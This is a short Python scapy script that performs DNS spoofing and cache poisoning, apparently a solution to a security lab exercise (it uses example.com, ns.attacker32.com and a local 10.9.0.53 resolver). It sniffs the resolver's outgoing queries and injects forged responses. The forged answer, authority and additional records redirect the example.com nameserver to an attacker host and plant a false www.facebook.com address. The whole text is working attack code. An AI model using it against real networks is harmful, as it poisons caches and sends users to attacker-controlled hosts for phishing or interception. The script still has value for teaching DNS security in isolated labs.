from scapy.all import *
import sys

NS_Name = 'example.com'

def spoof_dns(pkt):
    if(DNS in pkt and NS_Name in pkt[DNS].qd.qname.decode('utf-8')):
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))

        ip = IP(dst = pkt[IP].src, src = pkt[IP].dst) # Create an IP object  # Swap the source and destination IP address
        udp = UDP(dport=pkt[UDP].sport, sport = 53) # Create a UPD object    # Swap the source and destination port number
        Anssec = DNSRR(rrname = pkt[DNS].qd.qname, type = "A", rdata = '1.2.3.5', ttl = 200000) # Create an aswer record # The Answer Section
        NSSec = DNSRR(rrname=NS_Name, type='NS', ttl=259200, rdata='ns.attacker32.com') # The Authority Section
        #NSSec2 = DNSRR(rrname="google.com", type='NS', ttl=259200, rdata='ns.attacker32.com')
        NSSec2 = DNSRR(rrname=NS_Name, type='NS', ttl=259200, rdata='ns.example.com') # The Authority Section
        Addsec1 = DNSRR(rrname='ns.attacker32.com', type='A', ttl=259200, rdata='1.2.3.4')  # The Additional Section
        Addsec2 = DNSRR(rrname='ns.example.com', type='A', ttl=259200, rdata='5.6.7.8') # The Additional Section
        Addsec3 = DNSRR(rrname='www.facebook.com', type='A', ttl=259200, rdata='3.4.5.6') # The Additional Section
        #dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=2, an=Anssec, ns=NSSec/NSSec2) 
        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=2, arcount = 3, an=Anssec, ns=NSSec/NSSec2, ar=Addsec1/Addsec2/Addsec3) # Construct the DNS packet
        spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet # Construct the entire IP packet and send it out
        send(spoofpkt)

f = 'udp and (src host 10.9.0.53 and dst port 53)' # Set the filter
pkt=sniff(iface = 'br-4feeaf16db18', filter=f, prn=spoof_dns)

